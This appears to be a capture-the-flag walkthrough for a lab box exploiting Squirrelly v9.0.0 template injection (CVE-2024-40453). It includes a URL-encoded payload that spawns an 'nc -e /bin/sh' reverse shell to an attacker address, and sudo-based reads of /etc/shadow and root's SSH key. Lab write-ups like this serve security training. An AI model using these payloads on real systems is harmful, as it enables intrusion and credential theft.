##### Host entries
```bash
10.0.14.48
```

### Content

-   Squirrelly v9.0.0 RCE (CVE-2024-40453)

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
cat allPorts 
# Nmap 7.94SVN scan initiated Fri Jan 31 00:00:23 2025 as: nmap -p- -sS --open --min-rate 500 -Pn -n -vvvv -oG allPorts 10.0.14.48
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.14.48 ()     Status: Up
Host: 10.0.14.48 ()     Ports: 22/open/tcp//ssh///, 3000/open/tcp//ppp///
```
Services and Versions running:
```bash

```

### Exploitation

As shown in the netcat output, only port TCP-3000 is open, so we start by accessing to it from a browser just in case there is a website hosted:

![](/assets/img/Pasted-image-20250130234640.png)

From here there is a hint about the Template Engine, which makes us think about SSTI vulnerabilities, searching for an exploit on this I found this [Squirrelly v9.0.0 RCE](https://samuzora.com/posts/cve-2024-40453) with an excellent explanation with all the details we need to know, first of all to try out if the server might be vulnerable the following payload is used:

```bash
http://10.0.14.48:3000/?useWith=1&varName=console.log(%22x%22)
```
According with the blog post, if there is an error, then we are on the right way:
![](/assets/img/Pasted-image-20250130235003.png)

Then by reading all the blog, we identify the following payload that allows us to get a reverse shell:
```bash
http://10.0.14.48:3000/?useWith=1&varName=%7B%20a:%20b%20=%20global.process.mainModule.require(%22child_process%22).execSync(%22nc%20-e%20/bin/sh%2010.10.5.122%201234%22)%20%7D
```
And then we have a reverse shell as user `ETSCTF`:
```bash
nc -lvnp 1234     
listening on [any] 1234 ...
connect to [10.10.5.122] from (UNKNOWN) [10.0.14.48] 49658
python3 -c 'import pty; pty.spawn("/bin/bash")'
ETSCTF@squealer:/opt/app$
```

### Privilege Escalation

For privilege escalation there is a binary that can be executed as sudo without password:
```bash
ETSCTF@squealer:/opt/app$ sudo -l
Matching Defaults entries for ETSCTF on squealer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User ETSCTF may run the following commands on squealer:
    (ALL : ALL) NOPASSWD: /opt/node/bin/clisquir
```

Reading its content it seems that there is another squirrelly app within:
```bash
ETSCTF@squealer:/opt/app$ cat /opt/node/bin/clisquir
#!/opt/node/bin/node
var Sqrl = require('squirrelly')
var args = process.argv.slice(2);

var template = args[0];
var val = JSON.parse(args[1]) || { user: 'cool person' };
console.log(Sqrl.renderFile(template, val));
```

Searching for some payloads to exploit this kind of implementation I got this payload that allows Arbitrary File Read:

```bash
ETSCTF@squealer:/opt/app$ sudo /opt/node/bin/clisquir "/etc/shadow" '{}'
```
Finally to get root all it lefts is to read the id_rsa from root:
```bash
ETSCTF@squealer:/opt/app$ sudo /opt/node/bin/clisquir "/root/.ssh/id_rsa" '{}'
```
Run the `ssh -i id_rsa` and you'll get a root shell... AND WE ARE INSIDE!!!


### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`environment variables (env command)`
`/root`

### Credentials

No credentials were found or needed.

### Notes

-   Simple exploits, nothing fancy here.
